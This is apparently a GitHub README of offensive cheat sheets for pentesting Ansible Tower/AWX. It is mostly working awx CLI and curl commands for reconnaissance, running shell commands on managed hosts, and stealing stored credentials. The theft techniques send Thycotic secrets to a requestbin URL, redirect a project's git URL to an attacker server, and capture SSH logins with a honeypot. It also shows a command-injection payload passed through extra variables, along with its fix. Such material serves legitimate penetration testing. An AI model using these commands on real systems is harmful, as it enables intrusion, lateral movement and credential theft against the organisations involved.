# Offensive AWX

Offensive AWX consists of cheat sheets and information to pentest Ansible Tower and AWX. AWX will be used to refer to AWX as well as Ansible Tower. The `awx` CLI will be used throughout this documentation to allow for more flexible exploitation. Anything done with the CLI can usually be done with the UI as well.

Access to AWX can often be leveraged to pivot in an environment and gain remote code executions on servers.

* [Install AWX CLI](#install-awx-cli)
* [Authentication](#authentication)
  * [Username and password](#username-and-password)
  * [Inline](#inline)
  * [Tokens](#tokens)
* [Reconnaissance](#reconnaissance)
  * [Version](#version)
  * [Organizations](#organizations)
  * [Projects](#projects)
  * [Inventories](#inventories)
  * [Groups](#groups)
  * [Hosts](#hosts)
  * [Credentials](#credentials)
* [Code execution](#code-execution)
  * [Ad-Hoc commands](#ad-hoc-commands)
  * [Code execution through projects](#code-execution-through-projects)
    * [Creating or modifying projects](#creating-or-modifying-projects)
    * [Job templates](#job-templates)
* [Credential stealing](#credential-stealing)
  * [Thycotic secret server (Delinea)](#thycotic-secret-server-delinea)
  * [Source Control (username, password, PAT)](#source-control-username-password-pat)
  * [Machine (username, password)](#machine-username-password)

## Install AWX CLI

```bash
python -m pip install awxkit
```

## Authentication

### Username and password

To validate AWX credentials without having impact, you can use the `me` or the `ping` command. Exporting the variables will avoid having to specify them every request.

```bash
export CONTROLLER_HOST=http://10.1.1.1:10445
export CONTROLLER_USERNAME=admin
export CONTROLLER_PASSWORD=Passw0rd1
awx me
```

### Inline

You can specify your username and password on every request with the `--conf.username` and `--conf.password` parameters

```bash
awx --conf.username admin --conf.password Passw0rd1 me
```

### Tokens

Using the login function will create a personal access token. You may want to add a description for future reference:

```bash
export CONTROLLER_HOST=http://10.1.1.1:10445
export CONTROLLER_USERNAME=admin
export CONTROLLER_PASSWORD=Passw0rd1
awx login --description "Pentest XYZ" -f human
```

Listing your tokens will display the one you just created:

```bash
awx me -f human
awx tokens list -f human --filter "id,name,description" --user <id>
```

To clean up your token, you can use the `delete` function:

```bash
awx tokens delete <id>
```

## Reconnaissance

Gather information on the server's content.

### Version

```bash
awx ping
```

### Organizations

Organizations are security boundaries for inventories, users, etc.

Listing organizations in the human readable format:

```bash
awx organizations list -f human --filter "id,name,description"
```

Get one organization in particular:

```bash
awx organizations get <id>
```

### Projects

Listing projects in the human readable format:

```bash
awx projects list -f human --filter "id,name,description"
```

Get one project in particular:

```bash
awx projects get <id>
```

### Inventories

An inventory contains hosts.

Listing inventories in the human readable format:

```bash
awx inventory list -f human
```

Getting a specific inventory's details:

```bash
awx inventory get <id>
```

### Groups

Groups contain hosts as well. An inventory can be split into groups for more granular management.

List groups:

```bash
awx groups list -f human
```

List groups for an inventory:

```bash
awx groups list -f human --inventory <id>
```

### Hosts

List hosts:

```bash
awx hosts list -f human --filter "id,name,inventory"
```

List hosts by inventory:

```bash
awx hosts list -f human --filter "id,name,inventory" --inventory <id>
```

Get a single host:

```bash
awx hosts get <id>
```

### Credentials

Credentials can be used to connect to hosts to run commands.

```bash
awx -k --conf.host http://10.2.255.253:10445 --conf.username admin --conf.password JdkQyYf0JO8zqak4ldBwdusrEfFCw7Wm credentials list -f human
```

## Code execution

There are multiple approches to code execution. You can run ad-hoc commands, create or modify projects or templates, etc.

### Ad-Hoc commands

Listing ad-hoc commands in the human readable format:

```bash
awx --conf.host <url> --conf.username <username> --conf.token <token> ad_hoc_commands list -f human
```

Creating an add-hoc command and getting its output:

```bash
awx --conf.host <url> --conf.username <username> --conf.token <token> ad_hoc_commands create --inventory <inventory id> --credential <credential_id> --module_name shell --module_args 'whoami; hostname;'
awx --conf.host <url> --conf.username <username> --conf.token <token> ad_hoc_commands stdout <command id>
```

### Code execution through projects

#### Creating or modifying projects

Creating a project:

```bash
awx projects create --wait --organization  --name='My project' --scm_type git --scm_url 'https://github.com/lm-sec/offensive-awx.git' -f human
```

Modifying a project's `scm_url`:

```bash
awx projects modify <id> --scm_url "https://github.com/lm-sec/offensive-awx.git"
```

For a private git repository, you can create credentials and add them to the project. Use the `Source Control` credential type:

```bash
awx credential_types list -f human
awx organization list -f human
awx credentials create --name "GitHub read" --description "GitHub personal access token" --organization <id> --credential_type <id> --inputs '{ "username":"your-user", "password":"github_pat_your-access-token" }' -f human
awx projects modify <id> --credential <id> -f human
```

#### Job templates

Listing job templates in the human readable format:

```bash
awx job_templates list -f human
```

Creating a job template for the `hostname_whoami.yml` playbook for a project with the `scm_url` value of `https://github.com/lm-sec/offensive-awx.git`:

```bash
awx job_templates create --name='My job template' --project <id> --inventory <id> --playbook 'playbooks/hostname_whoami.yml' -f human
```

Launching a job template:

```bash
awx job_templates launch <id> --monitor -f human
```

Reading the output:

```bash
awx jobs stdout <id>
```

Changing a job template's playbook:

```bash
awx job_templates modify <id> --playbook "playbooks/hostname_whoami.yml"
```

Changing a job template's branch:

```bash
awx job_templates modify <id> --scm_branch "main"
```

## Credential stealing

Credentials stealing will between different types of credentials. Here are listed some techniques for some common types of credentials.

### Thycotic secret server (Delinea)

To steal these credentials, the idea is to send them to an attacker controlled website using the `test` API route.

The JSON data sent to test Thycotic secret server credentials:

```json
{"inputs": { "server_url": "https://requestbin.myworkato.com/13d3tpj1" }, "metadata": {"secret_id": "asdf", "secret_field": "asdf"}}
```

A short list of commands that leaks the password to a web server with the test function. It uses the login function to create a token and then tries the current credential values on the server specified in `server_url`:

```bash
URL="http://10.2.255.253:10445"
CRED_ID="8"
DATA='{"inputs": { "server_url": "https://requestbin.myworkato.com/13d3tpj1" }, "metadata": {"secret_id": "asdf", "secret_field": "asdf"}}'

awx login --description "Pentest XYZ" -f human
export CONTROLLER_OAUTH_TOKEN=<token>
curl -X POST -H "Authorization: Bearer $CONTROLLER_OAUTH_TOKEN" -H "Content-Type: application/json" --data-raw "$DATA" "$URL/api/v2/credentials/$CRED_ID/test/"
```

### Source Control (username, password, PAT)

To steal git credentials, you first need a web server that forces the git client to authenticate with basic authentication. Then, you run the following commands, pointing to your web server:

```bash
awx projects list -f human --filter "id,name,description,scm_url"
PROJECT_ID="10"
REQUEST_BIN="http://example.com:5000/"
awx projects modify $PROJECT_ID --scm_url $REQUEST_BIN
# The update should automatically update and connect to the server, but you can manually update with the following command
awx projects update $PROJECT_ID
```

> You can use [the provided Flask app](./tools/git_stealer/git_stealer.py) to leak git credentials.

### Machine (username, password)

To steal the SSH username and password, force the server to connect to your controlled machine and listen for the SSH credentials. An SSH honeypot can be used, like the following: <https://github.com/droberson/ssh-honeypot>.

```bash
PROJECT_ID="10"
REQUEST_BIN="http://example.com:5000/"
awx projects 
```

## Extra variables injection

**Extra variables** provided at the launch of a job_template [take precedence over all other sources of variables](https://docs.ansible.com/ansible-tower/latest/html/userguide/job_templates.html#extra-variables).
This makes it possible to override variables even if they were not intented to be specified at this level.
The variable could already be defined and it would still be overriden by the extra variables coming from the launch.
This is therefore exploitable when variables are used in insecure ways.

Here is an example of an insecure use of a variable : 

```yml
---
- name: read a file 
  hosts: all 
  vars:
    filepath: /etc/passwd
  tasks:
    - name: Show a file's contents
      ansible.builtin.shell: |
        cat '{{ filepath }}'
```

The code above will execute the `cat` command on the file specified in the `filepath` extra variable.
In this example, the `job_template` only allows the launcher to specify the extra variables.

It would then be possible to exploit the playbook by using the following `awx` command :

```bash
EXTRA_VARS="{\"filepath\": \"';whoami;#\"}"
awx job_template launch --extra_vars "${EXTRA_VARS}" <job_template_id>
```

This would then cause a command injection when this task is processed.

```bash
cat '{{ filepath }}' --> cat '';whoami;#
```

Since the playbook did not use the [quote](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/quote_filter.html) filter to escape the variable for safe shell use, we are able to escape the quotes and inject our command.
Changing the template command to the following will fix this vulnerability :

```bash
cat '{{ filepath | quote }}'
```

This is useful when you are constrained in what you can change about the job_template you have execution rights on.
Most of the time, this is when a system administrators has delegated certain job_templates to an actor for their work related activities.

